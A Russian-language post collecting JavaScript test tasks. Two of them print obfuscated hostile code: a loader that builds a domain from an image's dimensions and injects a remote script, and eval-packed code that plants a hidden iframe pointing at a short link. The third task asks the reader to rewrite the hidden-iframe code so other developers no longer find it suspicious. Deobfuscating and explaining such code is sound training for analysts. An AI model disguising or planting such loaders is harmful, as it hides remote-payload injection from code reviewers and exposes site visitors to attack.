Здесь будет различная подборка тестовых заданий, которые я встречал. 


# 1) задание первое:
раздуть код 
```javascript
name='foo';alert(window.name);
```
до одного килобайта.

# 2) задание второе:
        Объяснить, с какого адреса данный код
        ```javascript
              <script type="text/javascript" id="73901220182">
                (function(d,c,b,a,e){
                    with(new Image)onload=function(){with(this)a.push((1E6+1E3*width+1*height+a).slice(-6).replace(/\d{2}/g,
                    function(a){return"%"+(+a+97).toString(16)+c.split("")[a%6]})),a.push("com"),a=["/",unescape(a.join(".")),
                 [(new Date).getTime(),b.domain,e,0].join(",")],b.body.appendChild(b.createElement(c)).src=a.join(a[0])},src=d
                })("http://serve.oxystatic.com/init","script",document,[],73901220182)
                </script>
        ```
        подгрузит скрипт, и почему.

# 3) задание третье:
        Почему код по ссылке
        ```javascript
          var _0x371a=["\x30\x2E\x31\x7C\x7C\x30\x2E\x35\x28\x27\x3C\x31\x3E\x27\x29\x3B\x32\x3D\x30\x2E\x31\x2E\x36\x28\x30\x2E\x34\x28\x27\x33\x27\x29\x29\x3B\x32\x2E\x37\x3D\x27\x38\x3A\x2F\x2F\x64\x2E\x63\x2F\x62\x27\x2C\x32\x2E\x39\x2E\x61\x3D\x27\x65\x27\x3B","\x7C","\x73\x70\x6C\x69\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x62\x6F\x64\x79\x7C\x6E\x73\x6F\x64\x6B\x7C\x69\x66\x72\x61\x6D\x65\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x77\x72\x69\x74\x65\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x7C\x73\x74\x79\x6C\x65\x7C\x64\x69\x73\x70\x6C\x61\x79\x7C\x31\x32\x33\x34\x35\x36\x7C\x67\x6C\x7C\x67\x6F\x6F\x7C\x6E\x6F\x6E\x65","\x5C\x62","\x67","\x72\x65\x70\x6C\x61\x63\x65"];eval(function(_0x1019x1,_0x1019x2,_0x1019x3,_0x1019x4,_0x1019x5,_0x1019x6){while(_0x1019x3--){if(_0x1019x4[_0x1019x3]){_0x1019x1=_0x1019x1[_0x371a[6]]( new RegExp(_0x371a[4]+_0x1019x3.toString(_0x1019x2)+_0x371a[4],_0x371a[5]),_0x1019x4[_0x1019x3])}};return _0x1019x1;}(_0x371a[0],15,15,_0x371a[3][_0x371a[2]](_0x371a[1])));
      ```
        выглядит подозрительно?
        Переписать его так, чтобы он больше не вызывал подозрений у других разработчиков.
